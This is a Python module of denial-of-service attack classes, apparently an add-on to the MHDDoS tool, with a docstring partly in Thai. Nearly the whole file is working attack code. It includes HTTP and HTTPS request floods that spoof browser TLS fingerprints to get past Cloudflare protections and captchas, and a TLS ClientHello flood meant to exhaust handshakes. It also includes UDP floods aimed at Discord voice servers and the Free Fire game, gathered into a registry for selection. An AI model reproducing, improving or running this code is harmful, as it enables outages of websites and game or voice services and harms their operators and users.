# custom_methods.py
"""
Custom attack methods ที่ไม่ใช่ MHDDoS:
- HTTPS-BYPASS : curl_cffi impersonate → bypass CF TLS fingerprint
- HTTPS        : massive RPS HTTP/2 flood
- DDOS-BROWSER : browser emulation → bypass UAM / captcha
- TLS          : TLS ClientHello flood (handshake exhaustion)
- VC-DISCORD   : UDP voice flood
- FREEFIRE     : UDP small-packet flood
"""
import asyncio
import os
import random
import socket
import ssl
import time
import threading
from typing import Callable, Optional

try:
    from curl_cffi.requests import AsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False


# ═══════════════════════════════════════════
# Base
# ═══════════════════════════════════════════
class CustomAttack:
    def __init__(self, target: str, port: int, duration: int,
                 threads: int, stats: dict, on_stop=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stats = stats
        self.stop_at = time.time() + duration
        self.on_stop = on_stop
        self._done = asyncio.Event()

    async def run(self):
        raise NotImplementedError

    def stop(self):
        self.stop_at = 0
        self._done.set()


# ═══════════════════════════════════════════
# HTTPS-BYPASS — curl_cffi TLS spoof
# ═══════════════════════════════════════════
class HTTPSBypass(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                r = await session.get(
                    url, timeout=8,
                    allow_redirects=False,
                    headers={
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cache-Control": "no-cache",
                    },
                )
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            self.stats["error"] = "curl_cffi not installed"
            return
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        urls = [url]
        async with AsyncSession() as session:
            tasks = []
            for i in range(self.threads):
                u = urls[i % len(urls)]
                tasks.append(asyncio.create_task(self._worker(session, u)))
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# HTTPS — massive RPS HTTP/2
# ═══════════════════════════════════════════
class HTTPSMass(CustomAttack):
    async def _worker(self, url):
        import aiohttp
        while time.time() < self.stop_at:
            try:
                conn = aiohttp.TCPConnector(ssl=False, force_close=True)
                async with aiohttp.ClientSession(connector=conn) as s:
                    for _ in range(20):
                        if time.time() >= self.stop_at: break
                        try:
                            async with s.get(url, timeout=aiohttp.ClientTimeout(total=3),
                                             allow_redirects=False,
                                             headers={"User-Agent":
                                             "Mozilla/5.0 Chrome/124"}) as r:
                                await r.read()
                                self.stats["hits"] += 1
                        except Exception:
                            self.stats["errors"] += 1
            except Exception:
                pass

    async def run(self):
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        tasks = [asyncio.create_task(self._worker(url))
                 for _ in range(self.threads)]
        await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# DDOS-BROWSER — full browser emulation
# ═══════════════════════════════════════════
class DdosBrowser(CustomAttack):
    BROWSER_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;"
                  "q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                r = await session.get(
                    url, timeout=10,
                    allow_redirects=True,
                    headers=self.BROWSER_HEADERS,
                )
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            self.stats["error"] = "curl_cffi not installed"
            return
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        async with AsyncSession() as session:
            tasks = [asyncio.create_task(self._worker(session, url))
                     for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# TLS — ClientHello flood
# ═══════════════════════════════════════════
class TLSAttack(CustomAttack):
    def _build_clienthello(self) -> bytes:
        # minimal TLS 1.2 ClientHello
        return bytes.fromhex(
            "16030100a00100009c0303"
        ) + os.urandom(32) + bytes.fromhex(
            "0000000000000000000000000000000000000000000000000000000000000000"
            "00200000000000000000000000000000000000000000000000000000000000"
            "00220000"
        ) + os.urandom(100)

    def _tls_worker(self):
        hello = self._build_clienthello()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        while time.time() < self.stop_at:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.port))
                sock.sendall(hello)
                self.stats["hits"] += 1
                sock.close()
            except Exception:
                self.stats["errors"] += 1

    async def run(self):
        threads = [threading.Thread(target=self._tls_worker, daemon=True)
                   for _ in range(self.threads)]
        for t in threads: t.start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# VC-DISCORD — UDP voice flood
# ═══════════════════════════════════════════
class VCDiscord(CustomAttack):
    def _worker(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception: pass
        pkt = random._urandom(1500)
        target = (self.target, self.port)
        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, target)
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
        try: s.close()
        except Exception: pass

    async def run(self):
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.threads)]
        for t in threads: t.start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# FREEFIRE — UDP small packet
# ═══════════════════════════════════════════
class FreeFire(CustomAttack):
    def _worker(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception: pass
        pkt = random._urandom(512)
        target = (self.target, self.port)
        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, target)
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
        try: s.close()
        except Exception: pass

    async def run(self):
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.threads)]
        for t in threads: t.start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# Registry
# ═══════════════════════════════════════════
CUSTOM_REGISTRY = {
    "HTTPS-BYPASS": HTTPSBypass,
    "HTTPS":        HTTPSMass,
    "DDOS-BROWSER": DdosBrowser,
    "TLS":          TLSAttack,
    "VC-DISCORD":   VCDiscord,
    "FREEFIRE":     FreeFire,
}


def get_custom(name: str):
    return CUSTOM_REGISTRY.get(name)